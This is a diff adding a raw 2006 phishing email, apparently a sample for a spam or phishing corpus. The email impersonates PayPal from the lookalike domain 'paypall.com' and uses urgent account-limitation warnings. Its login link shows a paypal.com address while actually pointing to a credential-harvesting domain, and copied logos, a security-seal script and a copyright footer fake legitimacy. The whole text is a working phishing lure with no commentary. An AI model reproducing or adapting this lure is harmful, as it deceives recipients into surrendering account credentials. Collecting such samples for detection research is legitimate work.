@@ -1,0 +1,81 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <anonymous@honez-productions-d1.candidhosting.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id D91BC46987
+ for <user@login.example.com>; Thu,  5 Oct 2006 18:04:08 -0400 (EDT)
+Received: from honez-productions-d1.candidhosting.com (unknown
+ [66.230.204.130])
+ by mail.example.org (Postfix) with SMTP id CEB2C6CD25B
+ for <user@example.com>; Thu,  5 Oct 2006 18:04:08 -0400 (EDT)
+Received: (qmail 4224 invoked by uid 65534); 5 Oct 2006 22:03:50 -0000
+Date: 5 Oct 2006 22:03:50 -0000
+To: user@example.com
+Subject: Please Restore Your Account Access 
+Message-ID: <1160085830.12744.qmail@paypall.com>
+From: "service@paypal.com " <service@paypall.com>
+Content-Type: text/html
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 385
+
+<html>
+<head>
+<title></title>
+<style type=text/css>
+<!--
+.panel{-moz-border-radius: .3em .3em .3em .3em; border: 1px dotted silver; background-color: #F7F6F4;
+}
+-->
+</style>
+</head>
+<body>
+
+<TABLE align="center" width="70%" border=0>
+<tr>
+<td align="left"><img src="http://www.paypal.com/en_US/i/logo/paypal_logo.gif" border=0></td>
+</tr>
+<tr>
+<td>&nbsp;</td>
+</tr>
+
+
+	<TD><font color="Black" size="3"><b>Dear PayPal client,</b></font><br>
+	<br>
+	As part of our security measures, we regularly screen activity in the PayPal system. We recently contacted you after noticing an issue on your account.We requested information from you for the following reason:
+       <br><br>
+            We recently received a report of unauthorized credit card use associated with this account. If you now realize that this was a legitimate use of your credit card, please contact PayPal Customer Service.
+        <br> Case ID Number: PP-182-432-936 <br>
+          This is a reminder to log in to PayPal as soon as possible. <br>
+          Once you log in, you will be provided with steps to restore your account access. We appreciate your understanding as we work to ensure account safety. <br>
+         <br><strong> Click the link below to login to your account <br><br></strong>
+         
+         <a href="http://www.paypal.restoreaccessrv.com/us/webscr.php?cmd=LogIn" target="_blank">http://www.paypal.com/webscr?cmd=LogIn&amp;CASE&ID=PP-182-432-936 </a><br>
+
+         <br> In accordance with PayPal's User Agreement, your account access will remain limited until the issue has been resolved. Unfortunately, if access to your account remains limited for an extended period of time, it may result in further limitations or eventual account closure. We encourage you to log in to your PayPal account as soon as possible to help avoid this. <br>
+         <br>To review your account and some or all of the information that PayPal used to make its decision to limit your account access, please visit the Resolution Center. If, after reviewing your account information, you seek further clarification regarding your account access, please contact PayPal by visiting the Help Center and clicking "Contact Us". <br>
+         <br> We thank you for your prompt attention to this matter. Please understand that this is a security measure intended to help protect you and your account. We apologize for any inconvenience. <br>
+
+	 <br>
+	 
+      <p>Thank you for using PayPal!<BR>
+        The PayPal Team</p>
+      <br>
+
+               <div id="footer">
+<h2 class="accessAid">More Information</h2>
+<div id="footerSecure">
+<script type="text/javascript">var lang = 'en';var baseUrl ='https://seal.verisign.com/splash?form_file=fdf\/splash.fdf&dn=SCGI.EBAY.COM&lang='+lang;document.write ('<a href=\"'+baseUrl+'\" onclick=\"sw=window.open(\''+baseUrl+'\',\'VRSN_Splash\',\'location=yes,status=yes,resizable=yes,scrollbars=yes,width=560,height=500\');sw.focus();return false;\">');</script><img border="0" src="https://www.paypalobjects.com/en_US/i/logo/verisign.gif" alt=""><script type="text/javascript">document.write ('<\/a>');</script><p><a target="_blank" href="http://www.verisign.com/ssl-certificate">About SSL Certificates</a></p>
+</div>
+<p id="legal">Copyright © 1999-2006 PayPal. All rights reserved.<br><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/fdic">Information about FDIC pass-through insurance</a><br></p>
+</div>
+</div></body>
+</html>
+
+
+
+
+
+
